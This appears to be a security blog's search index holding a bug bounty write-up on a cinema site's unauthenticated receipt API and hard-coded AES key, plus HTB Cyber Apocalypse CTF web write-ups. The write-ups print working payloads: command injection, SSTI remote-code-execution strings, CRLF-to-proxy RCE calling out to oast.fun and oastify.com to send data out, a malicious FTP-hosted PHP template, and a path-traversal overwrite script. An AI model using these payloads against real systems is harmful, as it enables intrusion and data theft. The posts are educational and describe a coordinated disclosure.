[ { "title": "Tickets and Popcorn please!, The Day main.js Became the Key Vault", "url": "/posts/Tickets-popcorn-please/", "categories": "Writeup, Bug Bounty", "tags": "Writeup, Bug Bounty", "date": "2025-08-25 08:00:00 -0500", "snippet": "DisclaimerThis blog post is shared for educational and academic purposes only. All issues described here were responsibly reported to the affected company and have since been fixed and verified. Permission to publish was granted by the company.The intention of this write-up is to raise awareness, improve security practices, and share lessons learned with the community.Act I — The SetupIt all started on a lazy evening in April. I wasn’t trying to hack anything major, just poking around a movie ticketing site which I’m client of with DevTools open. As I added a ticket to my cart, something odd caught my eye: a POST request carrying a mysterious parameter named encInfo.“Why would a frontend encrypt its own traffic before sending it to its backend?”Pro Tip: In Caido, the first thing I do is filter the HTTP History with HTTPQL to cut out analytics noise and static requests. For example:req.method.cont:&quot;POST&quot; and not req.host.cont:&quot;analytics&quot;That was the spark. What began as casual curiosity turned into a journey where I ended up pulling strangers’ receipts and breaking AES encryption in the browser.“The checkout flow looked ordinary, until I noticed encInfo.”Act II — The First Discovery: Ghost ReceiptsThat weekend, I had planned to go to the movies with my girlfriend. She sent me a screenshot of her reservation: it showed the bookingId and the QR code of the ticket, but not the seat numbers. Curious, I wondered if it was possible to retrieve the full ticket details including seats using only the order number.With that in mind, I opened the developer tools and as I downloaded one of my own tickets, I began watching the network traffic, and that’s when I noticed a request that looked especially interesting.At first glance it felt too simple. My instinct was: surely the backend must cross-check this against a logged-in session or some signature. To confirm, I stripped the cookies and replayed the request. It still worked. That’s when I realized this endpoint was completely unauthenticated.Pro Tip: In Caido I like to replay with headers removed one by one (auth tokens, cookies, referers). This quickly reveals which ones actually matter. In this case, none did.Next, I wondered how resilient it was against tampering. I changed the bookingId slightly, swapping the last character. Half-expecting a 403 or error, I instead got back a massive Base64 blob in the response.A full movie ticket receipt for a user I had no relationship with that includes the following info: Full Name, Movie Title, Cine, Seat reserver, Date of visit, total price paid.The invoice retrieval relied entirely on a bookingId string — a 7-character alphanumeric identifier starting with W. I tried to reverse engineer this string, but was not created in the front, instead in the back, so it was random. Through light fuzzing and guesswork, I retrieved several valid receipts. But I needed scale, with a few lines of Python, I wrote a brute-forcer — and within seconds, my terminal was spitting out dozens of receipts.Some of the booking IDs I brute-forced returned perfectly valid, usable tickets, while others came back as expired or invalid. If the showtime was scheduled for the same day, the receipt was essentially “live” and could be used to claim entry. Anything older would still return a receipt, but one that no longer held any real-world value.This meant an attacker could take a valid booking ID, use it against the system, and walk into the cinema using someone else’s ticket. Because the IDs were weak and there was no authentication, what first looked like a small privacy issue quickly became a serious access control flaw, with real financial and reputational impact.Act III — The Cipher in the BrowserEven after pulling receipts, something still bugged me. Every sensitive request — adding tickets, concessions, even returns — had that weird encInfo blob attached. It was like a secret note passed between the frontend and the backend, except the note was just a mess of hex characters.At first, I tried poking at it. Change a byte, send it back, watch what happens. Every time I did, the server threw me either a 400 Bad Request or a 500 Internal Server Error. That told me one thing: this blob wasn’t just noise. The backend really cared about it.So I switched gears. If the backend cared so much, maybe the frontend could tell me why. I opened Chrome DevTools, jumped into Sources, and started scrolling through the minified spaghetti that was main.js.When hunting for crypto in JS, I’ve learned a trick: search for obvious strings like “AES” or “encrypt”, or just regex for anything that looks like a key. Thirty-two characters, all numbers? Suspicious. Sixteen characters of lowercase letters? Even more suspicious.And there it was. Jackpot. Right in the middle of the bundle:After scrolling through the minified main.js, I finally spotted the smoking gun: both the encryption key and the initialization vector (IV) were hard-coded directly into the bundle. That meant every encinfo request from the frontend was being encrypted with the exact same values, fully exposed to anyone inspecting the source. Right next to them, I also found the function call responsible for wrapping the sensitive JSON data before sending it to the backend:AES.encrypt(pad(JSON.stringify(data), 16), KEY, { iv: IV });No obfuscation. No key rotation. Just the crypto equivalent of leaving your house key under the doormat.Lesson: Never trust the client to encrypt or validate anything important.At this point, the puzzle pieces clicked together. If I had the key and the IV, then that big scary encInfo blob wasn’t scary at all, it was just encrypted JSON waiting to be freed.So I copied one out of a real request, fired up a quick Python script with PyCryptodome, and hit run:from Crypto.Cipher import AESfrom Crypto.Util.Padding import unpadimport binasciiKEY = b&quot;22021509147968334581420394558985&quot;IV = b&quot;ibfxivitgrpewzgj&quot;data = binascii.unhexlify(&quot;37B0E9B8...&quot;) # sample encInfocipher = AES.new(KEY, AES.MODE_CBC, IV)plaintext = unpad(cipher.decrypt(data), 16)print(plaintext.decode())And out came a neat little JSON:{ &quot;UserSessionId&quot;: &quot;995ec229c07cd2adc79289936e12f8fa&quot;, &quot;CinemaId&quot;: &quot;0000000001&quot;, &quot;Concessions&quot;: [ {&quot;ItemId&quot;: &quot;2624&quot;, &quot;Quantity&quot;: 2, &quot;PriceInCents&quot;: 6300} ], &quot;ReturnOrder&quot;: true, &quot;FirstRequest&quot;: false}With the key and IV in hand, encinfo was just AES‑CBC encrypted JSON. I grabbed one of my own requests, wrote a short Python script (PyCryptodome), and decrypted it. Out came plain business data: session IDs, items, prices, flags. For example, my popcorn order showed 6300 cents.&quot;Concessions&quot;: [ {&quot;ItemId&quot;: &quot;2624&quot;, &quot;Quantity&quot;: 2, &quot;PriceInCents&quot;: 0}]I then re‑encrypted the edited JSON with the same key/IV, dropped it back into the request, and replayed it.The backend didn’t blink. No error, no integrity check, no “are you kidding me?”This means an attacker could (not tested): Forge tickets and concession orders. Abuse the order flow (ReturnOrder, ProcessOrderValue). Change prices or claim refunds.That’s when it hit me: the browser wasn’t just handling presentation; it was acting like the bank vault for the entire ordering process. And with the AES key and IV lying around in main.js, I hadn’t broken in — they’d handed me the vault combination.SummaryThe platform exposed two critical flaws: Unauthenticated invoice API. Given only a bookingId, it returned Base64‑encoded PDF receipts, enabling enumeration and ticket misuse. Client‑side AES with hard‑coded secrets. The frontend used AES‑CBC with a static key and IV in main.js, allowing decryption, modification, and re‑encryption of sensitive request payloads (sessions, tickets, concessions, refunds) with no integrity protection. Together, these issues could leak personal information, enumerate active tickets, forge or alter orders, and abuse refund flows. Once I confirmed the impact, I stopped testing and reported it responsiblyLessons Learned Never trust the client for security. Cryptographic operations and secrets should live on the server, not in JavaScript. Use integrity checks. Encrypted blobs must be signed (e.g., HMAC, AEAD) to prevent tampering. Protect sensitive APIs with authentication and authorization. A booking receipt is personal data, it should never be accessible unauthenticated. Avoid predictable identifiers. Short, sequential booking codes make brute-forcing feasible; use long, random identifiers. Avoid security through obscurity Timeline Date Action April, 30, 2025 Initial report sent to the company May, 07, 2025 Initial response from the company June, 30, 2025 Vulnerability fixed, unable to reproduce August 21, 2025 Company give the rights to publish August 30, 2025 Blog post released ThanksI hope this write‑up is useful. Thanks for reading and sharing.We’ll be back soon.Special thanks for their help reviewing this post to: PuneyK Alguien xpnt MrDesdesUntil the next one, stay curious, stay ethical." }, { "title": "Cyber Apocalypse 2025 - 6x Web Challenges Writeup", "url": "/posts/CyberApocalypse-CTF2025-Web/", "categories": "HTB Writeups, Cyber Apocalypse CTF", "tags": "Writeup, CTF, Web", "date": "2025-03-25 08:00:00 -0500", "snippet": "I participated as a member of team CibersecUNI. This time i managed to solve all 6/6 challenges in the web category.Whispers of the MoonbeamObservando las funciones, nos dan una pista que se puede inyectar comandos con ;.Usando el comando gossip, puedo listar los archivos, se visualiza el archivo flag.txt, y con un simple ; puedo concatenar el comando cat para leer la flag.gossip; cat flag.txtObtenemos la flag. 🎉HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_78cb9b70be3bf077e608865b967b5ab1}Este fue un challenge muy directo de inyeccion de comandos.Trial by Fire 📦 web_trial_by_fire.zipObservando la UI, nos da una pista sobre SSTI.El reto nos muestra un campo en el cual podemos ingresar un nombre de usuario, el código de las rutas es:@web.route(&#39;/begin&#39;, methods=[&#39;POST&#39;])def begin_journey(): warrior_name = request.form.get(&#39;warrior_name&#39;, &#39;&#39;).strip() if not warrior_name: return redirect(url_for(&#39;web.index&#39;)) session[&#39;warrior_name&#39;] = warrior_name return render_template(&#39;intro.html&#39;, warrior_name=warrior_name)@web.route(&#39;/flamedrake&#39;)def flamedrake(): warrior_name = session.get(&#39;warrior_name&#39;) if not warrior_name: return redirect(url_for(&#39;web.index&#39;)) return render_template(&quot;flamedrake.html&quot;, warrior_name=warrior_name)@web.route(&#39;/battle-report&#39;, methods=[&#39;POST&#39;])def battle_report(): warrior_name = session.get(&quot;warrior_name&quot;, &quot;Unknown Warrior&quot;) battle_duration = request.form.get(&#39;battle_duration&#39;, &quot;0&quot;) stats = { &#39;damage_dealt&#39;: request.form.get(&#39;damage_dealt&#39;, &quot;0&quot;), &#39;damage_taken&#39;: request.form.get(&#39;damage_taken&#39;, &quot;0&quot;), &#39;spells_cast&#39;: request.form.get(&#39;spells_cast&#39;, &quot;0&quot;), &#39;turns_survived&#39;: request.form.get(&#39;turns_survived&#39;, &quot;0&quot;), &#39;outcome&#39;: request.form.get(&#39;outcome&#39;, &#39;defeat&#39;) }Se ingresa el payload 7*7 para validar si en alguna ruta ese valor se renderiza al usar una plantilla y nos muestra el valor de 49.En la ruta /flamedrake se observa que no se renderiza el payload ingresado, esto debido a que se toma el valor como string.Buscando otras rutas donde se renderiza el payload, se encuentra que en la ruta /battle-reports, nuestro payload se envía como parámetro y se renderiza el valor en la plantilla, lo cual hace que se visualize 49 en la respuesta.&amp;lt;div class=&quot;warrior-info&quot;&amp;gt; &amp;lt;i class=&quot;nes-icon is-large heart&quot;&amp;gt;&amp;lt;/i&amp;gt; &amp;lt;p class=&quot;nes-text is-primary warrior-name&quot;&amp;gt;{warrior_name}&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;Luego de verificar que efectivamente nuestro payload se renderiza como 49 en la respuesta, elaboramos nuestro payload para leer la flag.Usaremos el siguiente payload, extraido de Payload all the things, pero con las modificaciones necesarios para leer la flag.warrior_name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;cat%20flag.txt&#39;).read()}}Luego de inyectar nuestro payload para leer la flag, se puedo visualizar en la UI de la ruta /battle-reports nuestra flag.O desde Caido usando la funcion de replay.Se obtiene la flag. 🎉HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_9c285b69f155f1d253dfefe5fe30667d}Cyber AttackEste reto tiene varios pasos, pero en general se abusará de CRLF Injection + Proxy + RCESe observa un panel con 2 campos, name y domain, solo se puede usar el boton de Attack a Domain, ya que el boton de Attack an IP solo se puede realizar desde localhost. Gracias a esta porción de código en el index.php// Check if the user&#39;s IP is localconst isLocalIP = (ip) =&amp;gt; { return ip === &quot;127.0.0.1&quot; || ip === &quot;::1&quot; || ip.startsWith(&quot;192.168.&quot;);};// Get the user&#39;s IP addressconst userIP = &quot;&amp;lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;]; ?&amp;gt;&quot;;// Enable/disable the &quot;Attack IP&quot; button based on the user&#39;s IPconst attackIPButton = document.getElementById(&quot;attack-ip&quot;);attack-domain file:def is_domain(target): return re.match(r&#39;^(?!-)[a-zA-Z0-9-]{1,63}(?&amp;lt;!-)\\.[a-zA-Z]{2,63}$&#39;, target)form = cgi.FieldStorage()name = form.getvalue(&#39;name&#39;)target = form.getvalue(&#39;target&#39;)if not name or not target: print(&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;) elif is_domain(target): count = 1 # Increase this for an actual attack os.popen(f&#39;ping -c {count} {target}&#39;) print(f&#39;Location: ../?result=Succesfully attacked {target}!&#39;)else: print(f&#39;Location: ../?error=Hey {name}, watch it!&#39;) print(&#39;Content-Type: text/html&#39;)print()Se observa que imprime Location: y Content-Type, pero no valida que name no incluya \\r\\n, lo que permite inyectar nuevas cabeceras HTTP, adicionalmente en el archivo Dockerfile se habilita el módulo proxy para Apache, el cual permite enviar peticiones a servicios http.RUN a2enmod rewrite cgi proxy proxy_fcgi proxy_httpEjemplo, si envío name=a%0d%0aLocation: /a%0d%0aContent-Type: proxy:..., se transforma en la siguiente respuesta.HTTP/1.1 302 FoundLocation: /aContent-Type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=...Ahora que ya encontramos la forma de hacer solicitudes internas es hora de abusar del endpoint /attack-ip, el cual tiene como código.#!/usr/bin/env python3import cgiimport osfrom ipaddress import ip_addressform = cgi.FieldStorage()name = form.getvalue(&#39;name&#39;)target = form.getvalue(&#39;target&#39;)if not name or not target: print(&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;)try: count = 1 # Increase this for an actual attack os.popen(f&#39;ping -c {count} {ip_address(target)}&#39;) print(f&#39;Location: ../?result=Succesfully attacked {target}!&#39;)except: print(f&#39;Location: ../?error=Hey {name}, watch it!&#39;)print(&#39;Content-Type: text/html&#39;)print()Se observa que se intenta validar target con ip_address() de la librería ipaddress de Python, para asegurarse de que sea una IP válida, podemos inyectar comandos usando $, ya que Apache está ejecutando el CGI, entonces la inyección se da antes siquiera de que se llegue al código Python. Solo basta con proporcionar una IP valida, ya sea ipv4 o ipv6.Usaremos en este caso una ipv6 y el caracter especial $ para ejecutar comandos:::1%$(command)Nuestro payload completo se traduce a:GET /cgi-bin/attack-domain?target=-&amp;amp;name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%25%32%30aqsmhrfmvylkqdnuqyqqpqvhktneu42h2.oast.fun?testt)%260name=%0D%0A%0D%0AEl cual hace una simple petición a mi webhook para validar si funciona.Se observa que si funciona, otro incoveniente ahora es que no se puede usar / en el comando, entonces para listar y navegar por directorios tuve que usar un poco de ingenio.En vez de realizarcd ../../../ | base64 -w0Tuve que realizar el siguiente, dado que este comando no tiene el caracter ‘/’ y no rompe la sintaxis de una url.echo &#39;cd ..;cd ..;cd ..; ls&#39;|sh| base64 -w0echo &#39;cd ..;cd ..;cd ..; cat flag-jqpeei2a5jk8hr8.txt&#39;|sh| base64 -w0Como payload final para leer la flag usé Burp Collaborator para decodear a la vez de base64.GET /cgi-bin/attack-domain?target=-&amp;amp;name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%25%32%30cfvekttb0yhbc2ia84d9zkasqjwak68v.oastify.com?p=$(echo%25%32%30%27cd%25%32%30..%25%33%62cd%25%32%30..%25%33%62cd%25%32%30..%25%33%62%25%32%30cat%25%32%30*.txt%27|sh|%25%32%30base64%25%32%30-w0))%260name=%0D%0A%0D%0A Get the flag. 🎉HTB{h4ndl1n6_m4l4k4r5_f0rc35}Eldoria PanelEs una web que muestra misiones que pueden ser asignadas con la funcion “claim quest”.Code Review:La flag se encuentra en el directorio raiz con un nombre random gracias a esta linea en el entry.sh.mv /flag.txt /flag$(cat /dev/urandom | tr -cd &quot;a-f0-9&quot; | head -c 10).txt -&amp;gt; RCEToda página es retornada usando render.$app-&amp;gt;get(&#39;/dashboard&#39;, function (Request $request, Response $response, $args) { $html = render($GLOBALS[&#39;settings&#39;][&#39;templatesPath&#39;] . &#39;/dashboard.php&#39;); $response-&amp;gt;getBody()-&amp;gt;write($html); return $response;})-&amp;gt;add($authMiddleware);La funcion render es vulnerable a RCE por el uso de la funcion eval, pero está usando file_exists antes de llamar a file_get_contents.Es posible setear la ruta de los templates llamanda a /api/admin/appSettings$app-&amp;gt;post(&#39;/api/admin/appSettings&#39;, function (Request $request, Response $response, $args) { $data = json_decode($request-&amp;gt;getBody()-&amp;gt;getContents(), true); if (empty($data) || !is_array($data)) { $result = [&#39;status&#39; =&amp;gt; &#39;error&#39;, &#39;message&#39; =&amp;gt; &#39;No settings provided&#39;]; } else { $pdo = $this-&amp;gt;get(&#39;db&#39;); $stmt = $pdo-&amp;gt;prepare(&quot;INSERT INTO app_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value&quot;); foreach ($data as $key =&amp;gt; $value) { $stmt-&amp;gt;execute([$key, $value]); } if (isset($data[&#39;template_path&#39;])) { $GLOBALS[&#39;settings&#39;][&#39;templatesPath&#39;] = $data[&#39;template_path&#39;]; } $result = [&#39;status&#39; =&amp;gt; &#39;success&#39;, &#39;message&#39; =&amp;gt; &#39;Settings updated&#39;]; } $response-&amp;gt;getBody()-&amp;gt;write(json_encode($result)); return $response-&amp;gt;withHeader(&#39;Content-Type&#39;, &#39;application/json&#39;);})-&amp;gt;add($adminApiKeyMiddleware);El middleware es inútil porque llama a $handler-&amp;gt;handle($request); independientemente -&amp;gt; cada usuario puede llamar a rutas própias de admin.Como no podemos escribir archivos en el servidor, usaremos el servicio ftp, ya que sirve con file_exsists y file_get_contents.Levantaremos un servidor ftp donde hostearemos nuestro archivo template llamado dashboard.php, usaré este servicio gratuito online para levantar mi servidor ftp: Free FTP ServerCreamos nuestro archivo template malicioso llamado dashboard.php, este contiene dos comandos para listar archivos y otro para leer la flag.&amp;lt;?phpsystem(&quot;ls -la /flag*&quot;);system(&quot;cat /flag*&quot;);?&amp;gt;Se sube el archivo usando put dashboard.phpSeteamos la ruta de los templates haciendo un POST request a /api/admin/appSettings con el siguiente body:{ &quot;template_path&quot;: &quot;ftp://da192e7de042469196ddc45e20c9eb88:i2rMACU1fteQbrIEqh3zAqdNezrtTpKH@eu-central-1.sftpcloud.io&quot;}Hacemos una solicitud a dashboard.php para que cargue nuestro archivo malicioso y se ejecuten los comandos.Se obtiene la flag. 🎉HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_5f8e78373f521bac3069c1e39d487581}Eldoria RealmsHTB{p0llut3_4nd_h1t_pr0toc0lz_w_4_sw1tch_d730bc90109dcd38663a32b93f3ac999}" }, { "title": "Cyber Apocalypse 2024 - 4x Web Challenges Writeup", "url": "/posts/CyberApocalypse-CTF2024-Web/", "categories": "HTB Writeups, Cyber Apocalypse CTF", "tags": "HTB", "date": "2024-03-14 08:00:00 -0500", "snippet": "I participated as a member of team CibersecUNI. In the web category we solved 6/9 challenges as a team. In this writeup I will go through the ones that I have solved: Testimonial Labyrinth Linguist TimeKORP LocktalkTestimonialAs the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction’s hackers have set out to deface the official KORP website to send them a message that the revolution is closing in. 🐳 Instancer 2 IP (web ui and Grpc server) 📦 web_testimonial.zipBy looking at the file structure I could tell it’s a Golang app where you can send testimonials (name and content).We get 2 ips in the challenge, one is the web interface and the other is the Grpc server.When observing the functions of the website, we can think of stealing the cookies via stored XSS, but reviewing the code, there is no admin-type bot that is reviewing the testimonials.err := os.WriteFile(fmt.Sprintf(&quot;public/testimonials/%s&quot;, req.Customer), []byte(req.Testimonial), 0644):This block writes the received testimonial to a file located in the directory public/testimonials, with the name specified in the Customer field of the request.func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) { if req.Customer == &quot;&quot; { return nil, errors.New(&quot;Name is required&quot;) } if req.Testimonial == &quot;&quot; { return nil, errors.New(&quot;Content is required&quot;) } err := os.WriteFile(fmt.Sprintf(&quot;public/testimonials/%s&quot;, req.Customer), []byte(req.Testimonial), 0644) if err != nil { return nil, err } return &amp;amp;pb.GenericReply{Message: &quot;Testimonial submitted successfully&quot;}, nil}On the server, there is a directory traversal vulnerability in the handling of the client path. The Testimonial Customer field is used to specify the file location in which the testimonial will be stored. If this field is not properly validated and the inclusion of relative paths is allowed, we can manipulate this field to navigate outside the expected directory, like the root directory.We will use this method to overwrite the content of the html website, which is located in the path ../../view/home/index.templ.func GetTestimonials() []string { fsys := os.DirFS(&quot;public/testimonials&quot;) files, err := fs.ReadDir(fsys, &quot;.&quot;) if err != nil { return []string{fmt.Sprintf(&quot;Error reading testimonials: %v&quot;, err)} } var res []string for _, file := range files { fileContent, _ := fs.ReadFile(fsys, file.Name()) res = append(res, string(fileContent)) } return res}templ Testimonials() { for _, item := range GetTestimonials() { &amp;lt;div class=&quot;col-md-4&quot;&amp;gt; &amp;lt;div class=&quot;card mb-4&quot;&amp;gt; &amp;lt;div class=&quot;card-body&quot;&amp;gt; &amp;lt;p class=&quot;card-text&quot;&amp;gt;&quot;{item}&quot;&amp;lt;/p&amp;gt; &amp;lt;p class=&quot;text-muted&quot;&amp;gt;- Anonymous Testifier&amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; }}This is done by changing the path of public/testimonials to the root directory /, in this way it will read all the files inside the root directory, which is where the flag is located.I use copilot to help me build a script in go that: Set up a connection to the server Use the connection to create a new client Create a TestimonialSubmission message (replacing public/testimonial to /) Call the SubmitTestimonial methodpackage mainimport ( &quot;context&quot; &quot;fmt&quot; &quot;log&quot; &quot;os&quot; pb &quot;pb&quot; &quot;google.golang.org/grpc&quot;)func main() { // Set up a connection to the server. conn, err := grpc.Dial(&quot;83.136.249.230:43168&quot;, grpc.WithInsecure()) if err != nil { log.Fatalf(&quot;Did not connect: %v&quot;, err) } defer conn.Close() // Use the connection to create a new client client := pb.NewRickyServiceClient(conn) // Create a TestimonialSubmission message testimonial := &amp;amp;pb.TestimonialSubmission{ Customer: &quot;../../view/home/index.templ&quot;, Testimonial: &quot;package home\\n\\nimport (\\n\\t\\&quot;os\\&quot;\\n)\\n\\ntempl Index() {\\n\\t@layout.App(true) {\\n&amp;lt;div class=\\&quot;container\\&quot;&amp;gt;\\n &amp;lt;section&amp;gt;\\n &amp;lt;div class=\\&quot;row\\&quot;&amp;gt;\\n @Testimonials()\\n &amp;lt;/div&amp;gt;\\n &amp;lt;/section&amp;gt;\\n&amp;lt;/div&amp;gt;\\n}\\n\\nfunc GetTestimonials() []string {\\n\\tfsys := os.DirFS(\\&quot;/\\&quot;)\\n\\tfiles, err := fs.ReadDir(fsys, \\&quot;.\\&quot;)\\n\\tif err != nil {\\n\\t\\treturn []string{fmt.Sprintf(\\&quot;Error reading testimonials: %v\\&quot;, err)}\\n\\t}\\n\\tvar res []string\\n\\tfor _, file := range files {\\n\\t\\tfileContent, _ := fs.ReadFile(fsys, file.Name())\\n\\t\\tres = append(res, string(fileContent))\\n\\t}\\n\\treturn res\\n}\\n\\ntempl Testimonials() {\\n for _, item := range GetTestimonials() {\\n &amp;lt;div&amp;gt;\\n &amp;lt;p&amp;gt;{item}&amp;lt;/p&amp;gt;\\n &amp;lt;/div&amp;gt;\\n }\\n}&quot;, } // Call the SubmitTestimonial method ctx := context.Background() _, err = client.SubmitTestimonial(ctx, testimonial) if err != nil { log.Fatalf(&quot;Could not submit testimonial: %v&quot;, err) }}As you can see, in the testimonial parameter the entire content of the index.templ template is sent, to overwrite this file and display the content of the files in the / path.Before running the script, we change the path of the pb package with the path of the pb folder of the challenge, in my case I copied it to the path /usr/local/go/src/pb to call it directlyGet the flag. 🎉 It was cool to learn about grpc and golang as well. Thanks HackTheBox. :)Labyrinth LinguistYou and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive. 🐳 Instancer 📦 web_labyrinth_linguist.zipThis was a nice opportunity to see Velocity Set directive in action.By looking at the file structure and the web ui I could tell it’s a Java app that renders English text into Voxalith (kind of strange language)Looking at this part of the code in main.java, it reads the content of index.html file and stores it in the template string. Then getRuntimeServices() initializes the Velocity runtime services and a new Velocity template object is created.String template = &quot;&quot;;try { template = readFileToString(&quot;/app/src/main/resources/templates/index.html&quot;, textString);} catch (IOException e) { e.printStackTrace();}RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();StringReader reader = new StringReader(template);org.apache.velocity.Template t = new org.apache.velocity.Template();t.setRuntimeServices(runtimeServices);The following code is responsible to read the content of a file specified by filePath and store it in a StringBuilder named content. So it will replace occurrences of &quot;TEXT&quot; in each line with the replacement string.The vulnerability arises because the replacement string is inserted into the file content without any validation or sanitation.public static String readFileToString(String filePath, String replacement) throws IOException { StringBuilder content = new StringBuilder(); BufferedReader bufferedReader = null; try { bufferedReader = new BufferedReader(new FileReader(filePath)); String line; while ((line = bufferedReader.readLine()) != null) { line = line.replace(&quot;TEXT&quot;, replacement); content.append(line); content.append(&quot;\\n&quot;); } } finally { if (bufferedReader != null) { try { bufferedReader.close(); } catch (IOException e) { e.printStackTrace(); } } } return content.toString();}Researching about Velocity Framework vulnerabilities I came across this research.Apache Velocity Server-Side Template Injection - IWConnectThis blog explain that Velocity has directives. And one of them is the #set directive. With that directive you can execute system command through Java Classes and Constructors.So, then I modified the payload that it shows us to obtain RCE.import requestsdef sendPayload(payload): url = &quot;http://94.237.48.205:58185/&quot; result1 = requests.post(url, data={&quot;text&quot;: payload}).text return result1payload = &#39;&#39;&#39;#set($s=&quot;&quot;)#set($stringClass=$s.getClass())#set($stringBuilderClass=$stringClass.forName(&quot;java.lang.StringBuilder&quot;))#set($inputStreamClass=$stringClass.forName(&quot;java.io.InputStream&quot;))#set($readerClass=$stringClass.forName(&quot;java.io.Reader&quot;))#set($inputStreamReaderClass=$stringClass.forName(&quot;java.io.InputStreamReader&quot;))#set($bufferedReaderClass=$stringClass.forName(&quot;java.io.BufferedReader&quot;))#set($collectorsClass=$stringClass.forName(&quot;java.util.stream.Collectors&quot;))#set($systemClass=$stringClass.forName(&quot;java.lang.System&quot;))#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))#set($runtime=$stringClass.forName(&quot;java.lang.Runtime&quot;).getRuntime())#set($process=$runtime.exec(&quot;cat ../flagc713d64c65.txt&quot;))#set($null=$process.waitFor() )#set($inputStream=$process.getInputStream())#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))#set($stringBuilder=$stringBuilderConstructor.newInstance())#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))RCE is there. 🥳Or we can send only the payload directly into the input field, click submit and retrieve the flag.Get the flag. 🎉TimeKORPAre you ready to unravel the mysteries and expose the truth hidden within KROP’s digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.🐳 _Instancer_📦 ![web_timekorp.zip](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/zip/web_timekorp.zip)By looking at the file structure I could tell it’s a PHP app that shows the time in a format that is sent by the URL.In TimeController.php the format value is set, if the parameter is not sent, %H:%M:%S is set by default. Then passes it to the TimeModel class.$format = isset($_GET[&#39;format&#39;]) ? $_GET[&#39;format&#39;] : &#39;%H:%M:%S&#39;;$time = new TimeModel($format);In TimeModel.php, the format value will be passed in the public function __construct, this value is directly passed to exec() function. Using the exec() function is very dangerous since with a lack of sanitation it is possible to execute system commands.class TimeModel{ public function __construct($format) { $this-&amp;gt;command = &quot;date &#39;+&quot; . $format . &quot;&#39; 2&amp;gt;&amp;amp;1&quot;; } public function getTime() { $time = exec($this-&amp;gt;command); $res = isset($time) ? $time : &#39;?&#39;; return $res; }}So this is where Command Injection is happening, this line runs a shell command, with the format value received from the URL.$this-&amp;gt;command = &quot;date &#39;+&quot; . $format . &quot;&#39; 2&amp;gt;&amp;amp;1&quot;;We can break the string by prefixing input with a &#39; single-quote, then enter our command separator like | or ; and then avoid the redirection at the end with adding a trailing # comment to our input.So our request look like this:http://94.237.62.244:57142/?format=%Y-%m-%d&#39;|id+%23RCE is there. 🥳The last step is to run cat /flag and that will print the flag.http://94.237.62.244:57142/?format=%Y-%m-%d%27|cat+/flag+%23Get the flag. 🎉LockTalkIn “The Ransomware Dystopia,” LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force… 🐳 Instancer 📦 web_locktalk.zipBy looking at the file structure I could tell it’s a Python app that shows different endpoints.The main objective is to get acces to /api/v1/flag endpoint as an user with administrator role.@api_blueprint.route(&#39;/get_ticket&#39;, methods=[&#39;GET&#39;])def get_ticket(): claims = { &quot;role&quot;: &quot;guest&quot;, &quot;user&quot;: &quot;guest_user&quot; } token = jwt.generate_jwt(claims, current_app.config.get(&#39;JWT_SECRET_KEY&#39;), &#39;PS256&#39;, datetime.timedelta(minutes=60)) return jsonify({&#39;ticket&#39;: token})@api_blueprint.route(&#39;/chat/&amp;lt;int:chat_id&amp;gt;&#39;, methods=[&#39;GET&#39;])@authorize_roles([&#39;guest&#39;, &#39;administrator&#39;])def chat(chat_id): json_file_path = os.path.join(JSON_DIR, f&quot;{chat_id}.json&quot;) if os.path.exists(json_file_path): with open(json_file_path, &#39;r&#39;) as f: chat_data = json.load(f) chat_id = chat_data.get(&#39;chat_id&#39;, None) return jsonify({&#39;chat_id&#39;: chat_id, &#39;messages&#39;: chat_data[&#39;messages&#39;]}) else: return jsonify({&#39;error&#39;: &#39;Chat not found&#39;}), 404@api_blueprint.route(&#39;/flag&#39;, methods=[&#39;GET&#39;])@authorize_roles([&#39;administrator&#39;])def flag(): return jsonify({&#39;message&#39;: current_app.config.get(&#39;FLAG&#39;)}), 200The different endpoints are observed, to access /flag, the administrator role is needed, it is also observed that a JWT is being created with the PS256 algorithm and an expiration time of 60 minutes.First we need to retrieve the JWT in /api/v1/get_ticket endpoint, but its kind of protected as shown in the image below.Inspecting the haproxy.conf file, we see that the HAProxy is denying requests to endpoints starting with /api/v1/get_ticket.global daemon maxconn 256defaults mode http timeout connect 5000ms timeout client 50000ms timeout server 50000msfrontend haproxy bind 0.0.0.0:1337 default_backend backend http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }backend backend balance roundrobin server s1 